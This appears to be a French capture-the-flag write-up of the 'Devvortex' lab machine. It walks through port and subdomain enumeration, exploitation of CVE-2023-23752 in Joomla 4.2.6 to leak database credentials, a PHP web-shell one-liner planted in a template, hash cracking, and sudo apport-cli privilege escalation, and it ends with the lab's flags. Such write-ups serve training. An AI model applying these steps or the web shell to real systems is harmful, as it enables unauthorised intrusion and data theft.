
# Target : 10.129.229.146

# Enumeration des ports ouverts et leur version

```js
nmap -sV -sC 10.129.229.146
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 21:20 +0000
Nmap scan report for devvortex.htb (10.129.229.146)
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.69 seconds
```

# Enumeration du port 80     'nginx 1.18.0'

## Domain found 

```js
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Location: http://devvortex.htb/

```

![](/assets/Pasted-image-20260807212315.png)

## Directory Fuzzing

```js 
gobuster dir --url "http://devvortex.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
```


Rien d'interressant trouver

## Subdomain Fuzzing

```js
ffuf -u "http://devvortex.htb" -H "Host: FUZZ.devvortex.htb" -w /usr/share/wordlists/dnsmap.txt -fl 8
```

```js
dev
```

![](/assets/Pasted-image-20260807212731.png)![](/assets/Pasted-image-20260807212742.png)

## Identification de cms : joomla 4.2.6

```js
cmseek -u http://dev.devvortex.htb/
```

![](/assets/Pasted-image-20260807214300.png)

`Joomla 4.2.6 is vulnerable to critical security issues, most notably **CVE-2023-23752**, an improper access check vulnerability that allows unauthenticated attackers to perform sensitive information disclosure and potentially lead to remote code execution`

## PoC : [url: https://github.com/Acceis/exploit-CVE-2023-23752]

```js
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

## Creds Found

```js
lewis:P4ntherg0t1n5r3c0n##
```

## Connection au dashboard 

![](/assets/Pasted-image-20260807215223.png)


# Reverse shell

Se referencer a hacktricks `https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html`

If you managed to get **admin credentials** you can **RCE inside of it** by adding a snippet of **PHP code** to gain **RCE**. We can do this by **customizing** a **template**.

1. **Click** on **`Templates`** on the bottom left under `Configuration` to pull up the templates menu.
2. **Click** on a **template** name. Let’s choose **`protostar`** under the `Template` column header. This will bring us to the **`Templates: Customise`** page.
3. Finally, you can click on a page to pull up the **page source**. Let’s choose the **`error.php`** page. We’ll add a **PHP one-liner to gain code execution** as follows:
    1. **`system($_GET['cmd']);`**
4. **Save & Close**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

![](/assets/Pasted-image-20260807220249.png)


![](/assets/Pasted-image-20260807220338.png)

## Decouverte du hash de logan

```js
mysql -u lewis -p
```

```js
logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

![](/assets/Pasted-image-20260807221551.png)

```js
logan:tequieromucho
```

# User.txt : 247015c2db29e37b6496d6764447ab3b


```js
sudo -l
```

```js
(ALL : ALL) /usr/bin/apport-cl
```

se referer a Gtfobins pour exploiter ce abus de privilege

https://gtfobins.org/gtfobins/apport-cli/#inherit

# Root.txt : 16e85af8dcad11152a2117b9777ece13